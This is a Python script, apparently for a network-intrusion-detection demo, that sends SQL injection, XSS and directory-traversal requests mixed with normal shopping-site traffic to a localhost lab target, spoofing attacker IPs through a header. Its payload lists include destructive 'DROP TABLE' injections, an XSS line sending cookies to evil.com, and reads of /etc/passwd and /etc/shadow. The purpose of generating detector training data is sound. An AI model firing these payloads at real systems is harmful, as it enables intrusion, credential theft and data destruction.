"""
attack_scripts.py — Automated attack traffic generator for NIDS demo
Targets: http://localhost  (TechMart 靶機)
Attacks: SQL Injection / XSS / Directory Traversal  +  normal traffic
"""

import random
import sys
import time

import requests
from urllib.parse import quote

# Force UTF-8 output on Windows to avoid cp950 encoding errors
if sys.stdout.encoding and sys.stdout.encoding.lower() not in ("utf-8", "utf8"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")

TARGET = "http://localhost"
DELAY  = 0.3   # seconds between requests

# Simulated attacker IPs — injected as X-Real-IP so Apache logs the real source
# (Docker NATs all host traffic to 172.18.0.1; X-Real-IP is trusted by Apache)
ATTACKER_IPS = {
    "sqli":    "185.220.101.47",   # Known Tor exit / SQLi source
    "xss":     "45.142.212.100",   # Common XSS scanner IP range
    "dir":     "194.165.16.11",    # Dir traversal scanner
    "normal":  None,               # Normal traffic: no spoofing, log real host IP
}

# -- ANSI colours ----------------------------------------------
R    = "\033[91m"
Y    = "\033[93m"
G    = "\033[92m"
C    = "\033[96m"
W    = "\033[0m"
BOLD = "\033[1m"

def banner():
    print(f"""
{R}{BOLD}+------------------------------------------------------+
|         NIDS Attack Traffic Generator                |
|         Target : {TARGET:<35}|
+------------------------------------------------------+{W}
""")

# ---------------------------------------------------------------
# Payload libraries
# ---------------------------------------------------------------

SQLI_PAYLOADS = [
    # Classic auth bypass
    ("' OR '1'='1",                          "/search?q="),
    ("' OR '1'='1'--",                       "/search?q="),
    ("admin'--",                             "/login?user="),
    ("' OR 1=1--",                           "/login?user="),
    # UNION-based
    ("' UNION SELECT NULL,NULL,NULL--",      "/search?q="),
    ("' UNION SELECT username,password FROM users--", "/search?q="),
    ("1 UNION SELECT * FROM information_schema.tables--", "/search?q="),
    # Stacked / destructive
    ("'; DROP TABLE products;--",            "/search?q="),
    ("'; INSERT INTO users VALUES('hacker','pw');--", "/search?q="),
    # Boolean blind
    ("' AND 1=1--",                          "/search?q="),
    ("' AND 1=2--",                          "/search?q="),
    ("' AND SUBSTRING(username,1,1)='a'--",  "/search?q="),
    # Error-based
    ("' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--", "/search?q="),
    ("' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "/search?q="),
    # Time-based blind
    ("'; WAITFOR DELAY '0:0:3'--",           "/search?q="),
    ("' OR SLEEP(3)--",                      "/search?q="),
    # Parameter tampering
    ("1 OR 1=1",                             "/product?id="),
    ("999 UNION SELECT table_name FROM information_schema.tables", "/product?id="),
    ("0; SELECT * FROM users",               "/api/data?id="),
]

XSS_PAYLOADS = [
    # Script injection
    ("<script>alert('XSS')</script>",                       "/search?q="),
    ("<script>document.location='http://evil.com/steal?c='+document.cookie</script>", "/search?q="),
    ("<SCRIPT SRC='http://evil.com/xss.js'></SCRIPT>",      "/search?q="),
    # IMG onerror
    ("<img src=x onerror=alert(1)>",                        "/search?q="),
    ("<IMG SRC='javascript:alert(\"XSS\")'>",               "/search?q="),
    ("<img src=1 href=1 onerror=\"javascript:alert(1)\">",  "/search?q="),
    # Event handlers
    ("<body onload=alert('XSS')>",                          "/search?q="),
    ("<input onfocus=alert(1) autofocus>",                  "/search?q="),
    ("<svg/onload=alert(1)>",                               "/search?q="),
    ("<details open ontoggle=alert(1)>",                    "/search?q="),
    # JavaScript URI
    ("javascript:alert(document.cookie)",                   "/search?q="),
    ("JaVaScRiPt:alert(1)",                                 "/redirect?url="),
    # Data URI
    ("data:text/html,<script>alert(1)</script>",            "/search?q="),
    # DOM-based
    ("<iframe src=\"javascript:alert('XSS')\">",            "/search?q="),
    ("<object data=\"javascript:alert(1)\">",               "/search?q="),
    # Encoded
    ("%3Cscript%3Ealert(1)%3C%2Fscript%3E",                 "/search?q="),
    ("&#60;script&#62;alert(1)&#60;/script&#62;",           "/search?q="),
]

DIR_TRAVERSAL_PAYLOADS = [
    # Unix
    ("../../../etc/passwd",                         "/search?q="),
    ("../../../../etc/shadow",                      "/search?q="),
    ("../../../etc/hosts",                          "/search?q="),
    ("../../../proc/self/environ",                  "/search?q="),
    # Encoded
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",    "/search?q="),
    ("..%2F..%2F..%2Fetc%2Fpasswd",                "/search?q="),
    ("..%252f..%252f..%252fetc%252fpasswd",         "/search?q="),
    # Null byte
    ("../../../../etc/passwd%00",                   "/search?q="),
    ("../../../../etc/passwd%00.jpg",               "/file?name="),
    # Windows
    ("..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "/search?q="),
    ("..\\..\\..\\..\\.\\boot.ini",                "/search?q="),
    # Direct file access attempts
    ("/etc/passwd",                                 "/file?path="),
    ("/var/log/apache2/access.log",                 "/file?path="),
    ("....//....//....//etc/passwd",               "/search?q="),
    # Absolute path bypass
    ("/../../../../etc/passwd",                     "/search?q="),
    ("/./././././etc/passwd",                       "/search?q="),
]

NORMAL_TRAFFIC = [
    "/",
    "/search?q=laptop",
    "/search?q=iphone+15",
    "/search?q=headphones",
    "/search?q=mechanical+keyboard",
    "/search?q=monitor+4k",
    "/search?q=rtx+4090",
    "/search?q=macbook+air",
    "/search?q=gaming+mouse",
    "/search?q=usb+hub",
    "/search?q=airpods+pro",
    "/search?q=samsung+ssd",
    "/product?id=1",
    "/product?id=2",
    "/product?id=42",
    "/login",
    "/cart",
    "/about",
]

FAKE_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "python-requests/2.31.0",   # simulates a script
]

# ---------------------------------------------------------------
# HTTP sender
# ---------------------------------------------------------------

sent_count = {"sqli": 0, "xss": 0, "dir": 0, "normal": 0, "error": 0}

def send(label: str, url: str, color: str = W, attacker_ip: str | None = None) -> None:
    ua = random.choice(FAKE_USER_AGENTS)
    headers = {"User-Agent": ua}
    if attacker_ip:
        headers["X-Real-IP"] = attacker_ip
    try:
        r = requests.get(url, headers=headers, timeout=5, allow_redirects=True)
        status = r.status_code
        sym = "OK" if status < 400 else "!!"
        ip_tag = f" [{attacker_ip}]" if attacker_ip else ""
        print(f"  {color}[{sym}] [{label:7}] {status}{ip_tag}  {url[:80]}{W}")
        sent_count[label.lower().split()[0]] = sent_count.get(label.lower().split()[0], 0) + 1
    except Exception as e:
        print(f"  {R}[!!] [{label}] ERROR: {e}{W}")
        sent_count["error"] += 1
    time.sleep(DELAY)

# ---------------------------------------------------------------
# Attack phases
# ---------------------------------------------------------------

def phase_normal(n: int = 5) -> None:
    print(f"\n{G}{BOLD}--- Normal traffic ({n} requests) ---{W}")
    for _ in range(n):
        path = random.choice(NORMAL_TRAFFIC)
        send("normal", f"{TARGET}{path}", G, ATTACKER_IPS["normal"])

def phase_sqli() -> None:
    ip = ATTACKER_IPS["sqli"]
    print(f"\n{R}{BOLD}--- SQL Injection ({len(SQLI_PAYLOADS)} payloads) [src: {ip}] ---{W}")
    random.shuffle(SQLI_PAYLOADS)
    for payload, path in SQLI_PAYLOADS:
        url = f"{TARGET}{path}{quote(payload, safe='')}"
        send("SQLi", url, R, ip)

def phase_xss() -> None:
    ip = ATTACKER_IPS["xss"]
    print(f"\n{Y}{BOLD}--- XSS ({len(XSS_PAYLOADS)} payloads) [src: {ip}] ---{W}")
    random.shuffle(XSS_PAYLOADS)
    for payload, path in XSS_PAYLOADS:
        url = f"{TARGET}{path}{quote(payload, safe='')}"
        send("XSS", url, Y, ip)

def phase_dir_traversal() -> None:
    ip = ATTACKER_IPS["dir"]
    print(f"\n{C}{BOLD}--- Directory Traversal ({len(DIR_TRAVERSAL_PAYLOADS)} payloads) [src: {ip}] ---{W}")
    random.shuffle(DIR_TRAVERSAL_PAYLOADS)
    for payload, path in DIR_TRAVERSAL_PAYLOADS:
        url = f"{TARGET}{path}{quote(payload, safe='')}"
        send("DirTrav", url, C, ip)

# ---------------------------------------------------------------
# Main
# ---------------------------------------------------------------

def main() -> None:
    banner()

    # Mix in normal traffic before, during and after attacks
    phase_normal(6)
    phase_sqli()
    phase_normal(3)
    phase_xss()
    phase_normal(3)
    phase_dir_traversal()
    phase_normal(4)

    total = sum(sent_count.values())
    attacks = sent_count.get("sqli", 0) + sent_count.get("xss", 0) + sent_count.get("dirtrav", 0)
    print(f"""
{BOLD}============== Summary =============={W}
  Total requests  : {total}
  {R}SQL Injection   : {len(SQLI_PAYLOADS)}{W}
  {Y}XSS             : {len(XSS_PAYLOADS)}{W}
  {C}Dir Traversal   : {len(DIR_TRAVERSAL_PAYLOADS)}{W}
  {G}Normal traffic  : {sent_count.get('normal', 0)}{W}
  Errors          : {sent_count.get('error', 0)}
{BOLD}====================================={W}
All requests logged to apache-logs/access.log
Run the pipeline to push results to ELK:
  python predict.py -l apache-logs/access.log -m MODELS/model_RandomForestClassifier.pkl
""")

if __name__ == "__main__":
    main()
